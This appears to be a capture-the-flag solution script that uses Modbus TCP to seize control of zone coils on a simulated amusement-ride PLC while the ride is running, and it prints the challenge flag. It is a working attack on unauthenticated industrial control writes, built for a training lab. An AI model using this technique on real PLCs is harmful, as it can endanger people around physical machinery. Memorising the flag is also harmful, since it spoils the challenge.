#!/usr/bin/env python3
"""
CTF Challenge 9: Total Domination  
Difficulty: Expert
Points: 400
Flag: FLAG{Z0N3_0WN3RSHIP_C0MPL3T3}

Objective: Control all 3 zones with specific states while running
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_09_total_domination.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 9: Total Domination")
    print("[*] Objective: Z1=OFF, Z2=ON, Z3=OFF while state=2")

    # Check if running
    state = client.read_holding_registers(1039, 1).registers[0]
    print(f"[*] Current state: {state}")

    if state != 2:
        print("[!] Ride must be RUNNING (state=2)")
        print("[!] Start the ride first")
        client.close()
        sys.exit(1)

    print("\n[*] Executing zone control...")
    
    # Set zone configuration
    client.write_coil(5, False)  # zone_1_enable = FALSE
    client.write_coil(6, True)   # zone_2_enable = TRUE
    client.write_coil(7, False)  # zone_3_enable = FALSE

    print("[+] Zone configuration set!")
    print("[*] Z1: OFF")
    print("[*] Z2: ON")
    print("[*] Z3: OFF")
    print("[*] Holding for 5 seconds...")

    for i in range(5):
        time.sleep(1)
        z1 = client.read_coils(5, 1).bits[0]
        z2 = client.read_coils(6, 1).bits[0]
        z3 = client.read_coils(7, 1).bits[0]
        state = client.read_holding_registers(1039, 1).registers[0]

        print(f"[*] T+{i+1}s: Z1={z1} Z2={z2} Z3={z3} State={state}")

        if not z1 and z2 and not z3 and state == 2:
            if i == 4:  # After 5 seconds
                print("\n[+] Total zone domination achieved!")
                print("[+] Flag: FLAG{Z0N3_0WN3RSHIP_C0MPL3T3}")

    client.close()

if __name__ == "__main__":
    main()
